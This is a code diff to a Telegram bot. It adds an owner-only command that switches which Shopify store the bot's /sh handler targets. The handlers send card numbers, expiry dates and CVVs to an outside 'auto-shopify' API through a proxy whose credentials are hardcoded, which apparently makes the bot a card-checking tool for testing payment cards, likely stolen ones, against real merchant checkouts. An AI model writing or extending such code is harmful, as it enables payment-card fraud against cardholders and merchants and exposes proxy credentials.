@@ -2604,7 +2604,67 @@ from telegram.ext import ContextTypes
 from telegram.constants import ParseMode
 import re
 
+# Global Shopify site for /sh API requests
+CURRENT_SHOPIFY_SITE = "https://happyhealthyyou.com"
+
+
 logger = logging.getLogger(__name__)
+
+async def changeshsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global CURRENT_SHOPIFY_SITE
+    user = update.effective_user
+
+    # Optional: restrict to authorized users
+    AUTHORIZED_USERS = [8493360284]  # replace with your Telegram ID(s)
+    if user.id not in AUTHORIZED_USERS:
+        await update.message.reply_text("❌ You are not authorized to change the site.")
+        return
+
+    # Check if a new site was provided
+    if not context.args:
+        await update.message.reply_text("⚠️ Usage: /changeshsite https://newshopifysite.com")
+        return
+
+    new_site = context.args[0].strip()
+    if not new_site.startswith("http"):
+        await update.message.reply_text("❌ Invalid URL. Must start with http or https.")
+        return
+
+    # --- Test the site via API using a dummy card ---
+    test_card = "4242424242424242|12|2025|123"
+    api_url = (
+        f"https://auto-shopify-6cz4.onrender.com/index.php"
+        f"?site={new_site}"
+        f"&cc={test_card}"
+        f"&proxy=qhlpirsk-238:96zjmb7awmom@p.webshare.io:80"
+    )
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=30) as resp:
+                api_response_text = await resp.text()
+        
+        try:
+            api_response = json.loads(api_response_text)
+        except json.JSONDecodeError:
+            api_response = {"Response": api_response_text}
+
+        # Update global site
+        CURRENT_SHOPIFY_SITE = new_site
+
+        # Reply to user
+        await update.message.reply_text(
+            f"✅ Shopify site added: <code>{CURRENT_SHOPIFY_SITE}</code>\n"
+            f"📥 API Test Response: <code>{escape(json.dumps(api_response, indent=2)[:1000])}</code>",
+            parse_mode=ParseMode.HTML
+        )
+
+    except Exception as e:
+        await update.message.reply_text(
+            f"❌ Failed to test site: <code>{escape(str(e))}</code>",
+            parse_mode=ParseMode.HTML
+        )
+
 
 async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
     """
@@ -2652,7 +2712,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         # --- API request ---
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
-            f"?site=https://happyhealthyyou.com"
+            f"?site={CURRENT_SHOPIFY_SITE}"
             f"&cc={full_card}"
             f"&proxy=qhlpirsk-238:96zjmb7awmom@p.webshare.io:80"
         )
@@ -7000,6 +7060,7 @@ def main():
     # 🔐 Owner-only admin Commands
     owner_cmds = [
         ("admin", admin_command),
+        ("changeshsite", changeshsite_command),
         ("give_starter", give_starter),
         ("give_premium", give_premium),
         ("give_plus", give_plus),
